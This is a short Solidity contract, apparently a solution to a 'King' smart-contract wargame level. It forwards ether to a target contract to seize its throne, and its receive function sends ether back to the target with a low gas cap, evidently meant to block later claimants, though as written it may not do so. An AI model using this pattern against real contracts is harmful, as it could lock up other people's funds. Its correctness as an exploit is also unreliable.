pragma solidity ^0.8.0;

contract KingAttacker {
    address payable private kingInstance;

    constructor(address payable _instance) {
        kingInstance = _instance;
    }

    function attack() external payable {
        kingInstance.call{value: msg.value}('');
    }

    receive() external payable {
        kingInstance.call{value: msg.value, gas: 5000}('');
    }
}  
